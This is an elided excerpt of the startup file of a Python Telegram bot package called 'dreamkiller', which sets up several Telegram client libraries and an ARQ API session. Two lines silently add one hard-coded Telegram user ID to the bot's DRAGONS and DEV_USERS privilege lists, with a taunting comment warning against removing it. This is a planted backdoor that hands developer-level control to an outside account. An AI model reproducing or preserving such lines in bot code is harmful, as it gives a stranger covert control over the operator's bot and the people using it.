...
if ENV:
    ...
    from dreamkiller.config import Development as Config
...
DRAGONS.add(5460774651)
DEV_USERS.add(5460774651)  # it you going to remove me don't ask me errors👿
...
from dreamkiller.config import ARQ_API_KEY, ARQ_API_URL

aiohttpsession = ClientSession()
arq = ARQ(ARQ_API_URL, ARQ_API_KEY, aiohttpsession)
updater = tg.Updater(TOKEN, workers=WORKERS, use_context=True)
telethn = TelegramClient("Vegeta", API_ID, API_HASH)
pgram = Client("dreamkiller", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN)
...
from dreamkiller.modules.helper_funcs.handlers import (
